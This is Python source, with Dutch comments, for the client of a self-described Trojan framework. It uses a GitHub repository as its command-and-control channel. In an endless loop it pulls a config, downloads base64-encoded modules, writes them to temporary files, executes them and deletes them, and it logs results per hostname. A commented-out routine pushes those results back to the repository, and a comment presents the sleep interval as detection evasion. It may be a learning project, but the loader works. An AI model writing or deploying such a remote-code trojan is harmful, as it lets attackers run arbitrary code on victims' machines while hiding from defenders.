import os
import json
import random
import time
import importlib.util
import requests
import socket
import base64

# haal hostname op
hostname = socket.gethostname()

# Haal accestoken op
with open("accesToken.secret", 'r') as file:
    token = file.read().strip()
    

# Configuratie van de GitHub-repository
GITHUB_REPO = "https://api.github.com/repos/MauroSterckx/TrojanFramework"
ACCESS_TOKEN = token
CLIENT_ID = hostname  # kan nog aangepast worden met UUID ofzo?

# Basisheaders voor API-verzoeken
HEADERS = {
    "Authorization": f"token {ACCESS_TOKEN}",
    "Accept": "application/vnd.github.v3+json"
}

def fetch_config():
    # Download configuratiebestand van de GitHub-repo
    try:
        url = f"{GITHUB_REPO}/contents/config/config.json"
        response = requests.get(url, headers=HEADERS)
        
        if response.status_code == 200:
            # Haal Base64-gecodeerde inhoud op en decodeer het
            content = response.json()["content"]
            decoded_content = base64.b64decode(content).decode("utf-8")
            config = json.loads(decoded_content)  # Laad de gedecodeerde inhoud als JSON
            return config
        else:
            print(f"Fout bij ophalen van configuratie: {response.status_code}")
            return {}
    except Exception as e:
        print(f"Fout bij verwerken van configuratie: {e}")
        return {}

def fetch_module(module_name):
    try:
        url = f"{GITHUB_REPO}/contents/modules/{module_name}.py"
        response = requests.get(url, headers=HEADERS)

        if response.status_code == 200:
            # Decodeer Base64-gecodeerde inhoud
            encoded_content = response.json()["content"]
            decoded_content = base64.b64decode(encoded_content).decode("utf-8")

            # Schrijf de inhoud naar een tijdelijk bestand
            temp_path = f"temp_{module_name}.py"
            with open(temp_path, "w") as module_file:
                module_file.write(decoded_content)

            return temp_path
        else:
            print(f"Fout bij ophalen van module {module_name}: {response.status_code}")
            return None
    except Exception as e:
        print(f"Fout bij ophalen van module {module_name}: {e}")
        return None

def execute_module(module_path):
    # Voer module uit
    try:
        spec = importlib.util.spec_from_file_location("module", module_path)
        module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(module)
        result = module.run()  # Veronderstelt dat elke module een `run()`-functie heeft
        os.remove(module_path)  # Verwijder de tijdelijke module na uitvoering
        return result
    except Exception as e:
        print(f"Fout bij uitvoeren van module {module_path}: {e}")
        return {"status": "error", "error_message": str(e)}

# def send_results(data):
#     # Upload de resultaten van een module naar de data-map in de GitHub-repo
#     try:
#         file_path = f"data/{CLIENT_ID}.json"
#         url = f"{GITHUB_REPO}/contents/{file_path}"

#         # Huidige inhoud ophalen
#         response = requests.get(url, headers=HEADERS)
#         if response.status_code == 200:
#             sha = response.json()["sha"]
#         else:
#             sha = None  # Nieuw bestand

#         # Data voorbereiden
#         content = json.dumps(data)
#         encoded_content = base64.b64encode(content.encode("utf-8")).decode("utf-8")
#         payload = {
#             "message": "Update module results",
#             "content": encoded_content,
#             "sha": sha
#         }

#         # Uploaden
#         response = requests.put(url, headers=HEADERS, json=payload)
#         if response.status_code in [200, 201]:
#             print("Resultaten succesvol geüpload.")
#         else:
#             print(f"Fout bij uploaden: {response.status_code}")
#     except Exception as e:
#         print(f"Fout bij uploaden van resultaten: {e}")
        
        
def send_results(data):
    # Pad naar het resultaatbestand
    file_path = f"data/{CLIENT_ID}.json"
    
    # Controleer of het bestand al bestaat
    if os.path.exists(file_path):
        # Als het bestand al bestaat, lees de bestaande inhoud
        with open(file_path, 'r') as file:
            try:
                existing_data = json.load(file)
            except json.JSONDecodeError:
                existing_data = []  # Maak een lege lijst als het bestand niet goed te lezen is
    else:
        # Als het bestand nog niet bestaat, maak een nieuwe lijst
        existing_data = []
    
    # Voeg de nieuwe resultaten toe aan de bestaande data
    # Zorg ervoor dat data altijd een lijst is
    if isinstance(data, dict):
        existing_data.append(data)
    else:
        print("Error: De verwachte data is geen dictionary.")

    # Schrijf de bijgewerkte data naar het bestand
    with open(file_path, 'w') as file:
        json.dump(existing_data, file, indent=4)

    print("Resultaten succesvol geüpload.")


def main():
    # Hoofdfunctie van het Trojan-framework
    while True:
        config = fetch_config()
        if not config.get("modules"):
            print("Geen actieve modules. Trojan slaapt...")
        else:
            for module_name in config["modules"]:
                print(f"Uitvoeren van module: {module_name}")
                module_path = fetch_module(module_name)
                if module_path:
                    results = execute_module(module_path)
                    send_results({module_name: results})
        
        # Wacht een willekeurige tijd om detectie te voorkomen
        # sleep_time = random.randint(30, 120)  # 30 tot 120 seconden
        sleep_time= 10
        time.sleep(sleep_time)

if __name__ == "__main__":
    main()
